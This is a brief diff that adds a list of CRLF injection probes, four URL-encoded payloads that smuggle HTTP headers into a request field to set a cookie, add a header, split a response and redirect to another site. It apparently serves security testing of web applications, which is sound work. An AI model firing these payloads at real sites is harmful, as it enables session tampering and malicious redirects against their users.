@@ -1,0 +1,7 @@
+# CRLF injection probes
+%0d%0aSet-Cookie:test=1
+%0d%0aX-Test:1
+%0d%0aContent-Length:0%0d%0a%0d%0a
+%0d%0aLocation:https://example.com/
+
+
